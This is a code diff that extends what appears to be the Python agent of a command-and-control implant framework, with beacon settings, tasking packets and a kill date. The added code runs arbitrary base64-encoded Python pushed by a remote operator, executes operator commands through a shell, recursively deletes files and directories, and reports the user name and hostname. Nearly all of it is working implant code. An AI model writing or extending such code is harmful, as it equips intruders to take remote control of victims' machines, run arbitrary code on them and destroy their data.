@@ -16,6 +16,15 @@ import BaseHTTPServer
 import zipfile
 import io
 import imp
+import marshal
+import re
+import shutil
+import pwd
+import socket
+import math
+import stat
+import grp
+from stat import S_ISREG, ST_CTIME, ST_MODE
 from os.path import expanduser
 from StringIO import StringIO
 from threading import Thread
@@ -40,6 +49,8 @@ jitter = 0.0
 lostLimit = 60
 missedCheckins = 0
 jobMessageBuffer = ''
+currentListenerName = ""
+sendMsgFuncCode = ""
 
 # killDate form -> "MO/DAY/YEAR"
 killDate = 'REPLACE_KILLDATE'
@@ -133,7 +144,10 @@ def build_response_packet(taskingID, packetData, resultID=0):
     resultID = struct.pack('=H', resultID)
     
     if packetData:
-        packetData = base64.b64encode(packetData.decode('utf-8').encode('utf-8',errors='ignore'))
+        packetData = base64.b64encode(packetData.decode('utf-8').encode('utf-8','ignore'))
+        if len(packetData) % 4:
+            packetData += '=' * (4 - len(packetData) % 4)
+            
         length = struct.pack('=L',len(packetData))
         return packetType + totalPacket + packetNum + resultID + length + packetData
     else:
@@ -199,7 +213,7 @@ def process_tasking(data):
         if result:
             resultPackets += result
 
-        packetOffset = 8 + length
+        packetOffset = 12 + length
 
         while remainingData and remainingData != '':
             (packetType, totalPacket, packetNum, resultID, length, data, remainingData) = parse_task_packet(tasking, offset=packetOffset)
@@ -207,7 +221,7 @@ def process_tasking(data):
             if result:
                 resultPackets += result
 
-            packetOffset += 8 + length
+            packetOffset += 12 + length
         
         # send_message() is patched in from the listener module
         send_message(resultPackets)
@@ -252,10 +266,17 @@ def process_packet(packetType, data, resultID):
 
     elif packetType == 40:
         # run a command
-        resultData = str(run_command(data))
-        #Not sure why the line below is there.....
-        #e = build_response_packet(40, resultData, resultID)
-        return build_response_packet(40, resultData + "\r\n ..Command execution completed.", resultID)
+        parts = data.split(" ")
+        
+        if len(parts) == 1:
+            data = parts[0]
+            resultData = str(run_command(data))
+            return build_response_packet(40, resultData + "\r\n ..Command execution completed.", resultID)
+        else:
+            cmd = parts[0]
+            cmdargs = ' '.join(parts[1:len(parts)])
+            resultData = str(run_command(cmd, cmdargs=cmdargs))
+            return build_response_packet(40, resultData + "\r\n ..Command execution completed.", resultID)
 
     elif packetType == 41:
         # file download
@@ -415,6 +436,21 @@ def process_packet(packetType, data, resultID):
         # TODO: implement job structure
         pass
 
+    elif packetType == 121:
+        #base64 decode the script and execute
+        script = base64.b64decode(data)
+        try:
+            buffer = StringIO()
+            sys.stdout = buffer
+            code_obj = compile(script, '<string>', 'exec')
+            exec code_obj in globals()
+            sys.stdout = sys.__stdout__
+            result = str(buffer.getvalue())
+            return build_response_packet(121, result, resultID)
+        except Exception as e:
+            errorData = str(buffer.getvalue())
+            return build_response_packet(0, "error executing specified Python data %s \nBuffer data recovered:\n%s" %(e, errorData), resultID)
+
     elif packetType == 122:
         #base64 decode and decompress the data
         try:
@@ -431,9 +467,12 @@ def process_packet(packetType, data, resultID):
 
         zdata = dec_data['data']
         zf = zipfile.ZipFile(io.BytesIO(zdata), "r")
-        moduleRepo[fileName] = zf
-        install_hook(fileName)
-        send_message(build_response_packet(122, "Successfully imported %s" % (fileName), resultID))
+        if fileName in moduleRepo.keys():
+            send_message(build_response_packet(122, "%s module already exists" % (fileName), resultID))
+        else:
+            moduleRepo[fileName] = zf
+            install_hook(fileName)
+            send_message(build_response_packet(122, "Successfully imported %s" % (fileName), resultID))
 
     elif packetType == 123:
         #view loaded modules
@@ -829,34 +868,98 @@ def data_webserver(data, ip, port, serveCount):
     httpServer.server_close()
     return
 
-# additional implementation methods
-def run_command(command):
-    if "|" in command:
-        command_parts = command.split('|')
-    elif ">" in command or ">>" in command or "<" in command or "<<" in command:
-        p = subprocess.Popen(command,stdin=None, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
-        return ''.join(list(iter(p.stdout.readline, b'')))
-    else:
-        command_parts = []
-        command_parts.append(command)
-    i = 0
-    p = {}
-    for command_part in command_parts:
-        command_part = command_part.strip()
-        if i == 0:
-            p[i]=subprocess.Popen(shlex.split(command_part),stdin=None, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        else:
-            p[i]=subprocess.Popen(shlex.split(command_part),stdin=p[i-1].stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        i = i +1
-    (output, err) = p[i-1].communicate()
-    exit_code = p[0].wait()
-    if exit_code != 0:
-        errorStr =  "Shell Output: " + str(output) + '\n'
-        errorStr += "Shell Error: " + str(err) + '\n'
-        return errorStr
-    else:
-        return str(output)
+def permissions_to_unix_name(st_mode):
+    permstr = ''
+    usertypes = ['USR', 'GRP', 'OTH']
+    for usertype in usertypes:
+        perm_types = ['R', 'W', 'X']
+        for permtype in perm_types:
+            perm = getattr(stat, 'S_I%s%s' % (permtype, usertype))
+            if st_mode & perm:
+                permstr += permtype.lower()
+            else:
+                permstr += '-'
+    return permstr
 
+def directory_listing(path):
+    # directory listings in python
+    # https://www.opentechguides.com/how-to/article/python/78/directory-file-list.html
+
+    res = ""
+    for fn in os.listdir(path):
+        fstat = os.stat(os.path.join(path, fn))
+        permstr = permissions_to_unix_name(fstat[0])
+
+        if os.path.isdir(fn):
+            permstr = "d{}".format(permstr)
+        else:
+            permstr = "-{}".format(permstr)
+
+        user = pwd.getpwuid(fstat.st_uid)[0]
+        group = grp.getgrgid(fstat.st_gid)[0]
+
+        # Convert file size to MB, KB or Bytes
+        if (fstat.st_size > 1024 * 1024):
+            fsize = math.ceil(fstat.st_size / (1024 * 1024))
+            unit = "MB"
+        elif (fstat.st_size > 1024):
+            fsize = math.ceil(fstat.st_size / 1024)
+            unit = "KB"
+        else:
+            fsize = fstat.st_size
+            unit = "B"
+
+        mtime = time.strftime("%X %x", time.gmtime(fstat.st_mtime))
+
+        res += '{} {} {} {:18s} {:f} {:2s} {:15.15s}\n'.format(permstr,user,group,mtime,fsize,unit,fn)
+
+    return res
+
+# additional implementation methods
+def run_command(command, cmdargs=None):
+    
+    if re.compile("(ls|dir)").match(command):
+        if cmdargs == None or not os.path.exists(cmdargs):
+            cmdargs = '.'
+
+        return directory_listing(cmdargs)
+
+    elif re.compile("pwd").match(command):
+        return str(os.getcwd())
+    elif re.compile("rm").match(command):
+        if cmdargs == None:
+            return "please provide a file or directory"
+        
+        if os.path.exists(cmdargs):
+            if os.path.isfile(cmdargs):
+                os.remove(cmdargs)
+                return "done."
+            elif os.path.isdir(cmdargs):
+                shutil.rmtree(cmdargs)
+                return "done."
+            else:
+                return "unsupported file type"
+        else:
+            return "specified file/directory does not exist"
+    elif re.compile("mkdir").match(command):
+        if cmdargs == None:
+            return "please provide a directory"
+
+        os.mkdir(cmdargs)
+        return "Created directory: {}".format(cmdargs)
+
+    elif re.compile("(whoami|getuid)").match(command):
+        return pwd.getpwuid(os.getuid())[0]
+
+    elif re.compile("hostname").match(command):
+        return str(socket.gethostname())
+
+    else:
+        if cmdargs != None:
+            command = "{} {}".format(command,cmdargs)
+        
+        p = subprocess.Popen(command, stdin=None, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
+        return p.communicate()[0].strip()
 
 def get_file_part(filePath, offset=0, chunkSize=512000, base64=True):
 
